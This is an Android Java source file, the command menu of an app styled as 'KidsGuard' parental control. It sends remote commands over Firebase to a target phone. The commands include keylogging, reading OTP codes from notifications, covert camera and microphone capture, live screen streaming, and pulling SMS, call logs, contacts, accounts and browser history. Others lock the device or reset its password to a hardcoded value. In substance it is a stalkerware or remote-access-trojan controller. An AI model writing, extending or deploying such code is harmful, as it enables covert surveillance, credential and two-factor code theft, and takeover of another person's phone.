package com.kidsguard.parent;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;

public class AllCommandsActivity extends Activity {

    String deviceCode;
    ListView listView;
    ArrayList<CommandItem> commandList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceCode = getIntent().getStringExtra("device_code");
        listView = new ListView(this);
        setContentView(listView);
        setTitle("All Remote Commands");

        commandList = generateRealCommands();

        ArrayList<String> displayNames = new ArrayList<>();
        for (CommandItem item : commandList) {
            displayNames.add(item.id + ". " + item.name);
        }

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                android.R.layout.simple_list_item_1, displayNames);
        listView.setAdapter(adapter);

        listView.setOnItemClickListener((parent, view, position, id) -> {
            CommandItem cmd = commandList.get(position);
            FirebaseHelper.sendCommand(deviceCode, cmd.commandKey, cmd.arg);
            Toast.makeText(this, "Executing: " + cmd.name, Toast.LENGTH_SHORT).show();

            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", cmd.resultPath);
            i.putExtra("title", cmd.name);
            startActivity(i);
        });
    }

    private ArrayList<CommandItem> generateRealCommands() {
        ArrayList<CommandItem> list = new ArrayList<>();
        int id = 1;

        // --- Location ---
        list.add(new CommandItem(id++, "Get Live Location", "get_location", "", "location.json"));
        list.add(new CommandItem(id++, "Get Location Providers", "get_location_providers", "", "location_providers.json"));

        // --- Camera & Capture ---
        list.add(new CommandItem(id++, "Capture Front Camera", "camera", "front", "result.json"));
        list.add(new CommandItem(id++, "Capture Back Camera", "camera", "back", "result.json"));
        list.add(new CommandItem(id++, "Take Screenshot", "screenshot", "", "result.json"));

        // --- Audio / Mic ---
        list.add(new CommandItem(id++, "Start Mic Recording", "start_mic", "", "result.json"));
        list.add(new CommandItem(id++, "Stop Mic Recording", "stop_mic", "", "result.json"));

        // --- Monitoring ---
        list.add(new CommandItem(id++, "Get Keylog", "get_keylog", "", "keylog.json"));
        list.add(new CommandItem(id++, "Get Notifications", "get_notifications", "", "notifications.json"));
        list.add(new CommandItem(id++, "Get Screen Time", "get_screen_time", "", "screentime.json"));
        list.add(new CommandItem(id++, "Get Clipboard", "get_clipboard", "", "clipboard.json"));
        list.add(new CommandItem(id++, "Get OTP Codes", "get_otp", "", "notifications.json"));

        // --- Data Access ---
        list.add(new CommandItem(id++, "Get Contacts", "get_contacts", "", "contacts.json"));
        list.add(new CommandItem(id++, "Get SMS", "get_sms", "", "sms.json"));
        list.add(new CommandItem(id++, "Get Call Logs", "get_call_logs", "", "call_logs.json"));
        list.add(new CommandItem(id++, "Get Browser History", "get_browser_history", "", "browser_history.json"));
        list.add(new CommandItem(id++, "Get Recordings List", "get_recordings", "", "recordings.json"));
        list.add(new CommandItem(id++, "Get Installed Apps", "get_installed_apps", "", "installed_apps.json"));

        // --- Device Control ---
        list.add(new CommandItem(id++, "Lock Screen", "lock_screen", "", "result.json"));
        list.add(new CommandItem(id++, "Send Alarm (Toggle)", "send_alarm", "", "result.json"));
        list.add(new CommandItem(id++, "Vibrate Device", "vibrate_device", "", "result.json"));
        list.add(new CommandItem(id++, "Toggle Flashlight", "toggle_flashlight", "", "result.json"));
        list.add(new CommandItem(id++, "Toggle WiFi", "toggle_wifi", "", "result.json"));
        list.add(new CommandItem(id++, "Toggle Bluetooth", "toggle_bluetooth", "", "result.json"));
        list.add(new CommandItem(id++, "Toggle Rotation", "toggle_rotation", "", "result.json"));
        list.add(new CommandItem(id++, "Get Brightness", "get_brightness", "", "brightness.json"));
        list.add(new CommandItem(id++, "Open URL in Browser", "open_browser_url", "https://google.com", "result.json"));

        // --- Global Actions (via Accessibility) ---
        list.add(new CommandItem(id++, "Press BACK", "global_action", "back", "result.json"));
        list.add(new CommandItem(id++, "Press HOME", "global_action", "home", "result.json"));
        list.add(new CommandItem(id++, "Open Recents", "global_action", "recents", "result.json"));

        // --- Device Info ---
        list.add(new CommandItem(id++, "Get Device Info", "get_device_info", "", "info.json"));
        list.add(new CommandItem(id++, "Get CPU Info", "get_cpu_info", "", "cpu_info.json"));
        list.add(new CommandItem(id++, "Get CPU Cores", "get_cpu_cores_count", "", "cpu_cores.json"));
        list.add(new CommandItem(id++, "Get CPU ABI", "get_cpu_abi", "", "cpu_abi.json"));
        list.add(new CommandItem(id++, "Get Memory Info", "get_memory_info", "", "memory.json"));
        list.add(new CommandItem(id++, "Get Storage Info", "get_storage_info", "", "storage.json"));
        list.add(new CommandItem(id++, "Get Available Storage", "get_available_storage_bytes", "", "storage_avail.json"));
        list.add(new CommandItem(id++, "Get Display Info", "get_display", "", "display.json"));
        list.add(new CommandItem(id++, "Get Battery Health", "get_battery_health", "", "battery.json"));
        list.add(new CommandItem(id++, "Get Kernel Version", "get_kernel_version", "", "kernel.json"));
        list.add(new CommandItem(id++, "Get Bootloader", "get_bootloader_version", "", "bootloader.json"));
        list.add(new CommandItem(id++, "Get Build Fingerprint", "get_device_build_fingerprint", "", "fingerprint.json"));
        list.add(new CommandItem(id++, "Get Hardware Name", "get_hardware_name", "", "hardware.json"));
        list.add(new CommandItem(id++, "Get System Uptime", "get_system_uptime", "", "uptime.json"));
        list.add(new CommandItem(id++, "Get Root Status", "get_root_status", "", "root.json"));
        list.add(new CommandItem(id++, "Get OpenGL Version", "get_opengl_version", "", "opengl.json"));
        list.add(new CommandItem(id++, "Get NFC Status", "get_nfc_status", "", "nfc.json"));
        list.add(new CommandItem(id++, "Get Sensor List", "get_sensor_list", "", "sensors.json"));

        // --- Network ---
        list.add(new CommandItem(id++, "Get WiFi Info", "get_wifi", "", "wifi.json"));
        list.add(new CommandItem(id++, "Scan WiFi Networks", "scan_wifi", "", "wifi_scan.json"));
        list.add(new CommandItem(id++, "Get Network Info", "get_network_info", "", "network.json"));
        list.add(new CommandItem(id++, "Get Network Interfaces", "get_network_interfaces", "", "network_interfaces.json"));
        list.add(new CommandItem(id++, "Get Telephony Info", "get_telephony_info", "", "telephony.json"));

        // --- System ---
        list.add(new CommandItem(id++, "Get Running Processes", "get_running_processes", "", "processes.json"));
        list.add(new CommandItem(id++, "Get Accounts", "get_accounts", "", "accounts.json"));
        list.add(new CommandItem(id++, "Get Audio Volume", "get_audio_volume_levels", "", "volumes.json"));
        list.add(new CommandItem(id++, "Get Locale Info", "get_locale_info", "", "locale.json"));
        list.add(new CommandItem(id++, "Get Time Zone", "get_device_time_zone", "", "timezone.json"));
        list.add(new CommandItem(id++, "Get Airplane Mode", "get_airplane_mode", "", "airplane_mode.json"));
        list.add(new CommandItem(id++, "Get USB State", "get_usb_state", "", "usb.json"));
        list.add(new CommandItem(id++, "Get Accessibility Services", "get_accessibility_services", "", "accessibility.json"));

        // --- Device Admin ---
        list.add(new CommandItem(id++, "Get Admin Status", "get_admin_status", "", "admin_status.json"));
        list.add(new CommandItem(id++, "Disable Camera", "disable_camera", "", "result.json"));
        list.add(new CommandItem(id++, "Enable Camera", "set_camera_disabled", "false", "result.json"));
        list.add(new CommandItem(id++, "Set PIN", "set_pin", "1234", "result.json"));
        list.add(new CommandItem(id++, "Reset Password", "reset_password", "", "result.json"));

        // --- Night Mode / Password ---
        list.add(new CommandItem(id++, "Set Night Mode", "set_night_mode", "21:00,07:00", "result.json"));
        list.add(new CommandItem(id++, "Set Password", "set_password", "newpass123", "result.json"));

        // --- Live Stream ---
        list.add(new CommandItem(id++, "Start Live Stream", "start_stream", "", "result.json"));
        list.add(new CommandItem(id++, "Stop Live Stream", "stop_stream", "", "result.json"));

        return list;
    }

    static class CommandItem {
        int id;
        String name;
        String commandKey;
        String arg;
        String resultPath;

        CommandItem(int id, String name, String commandKey, String arg, String resultPath) {
            this.id = id;
            this.name = name;
            this.commandKey = commandKey;
            this.arg = arg;
            this.resultPath = resultPath;
        }
    }
}
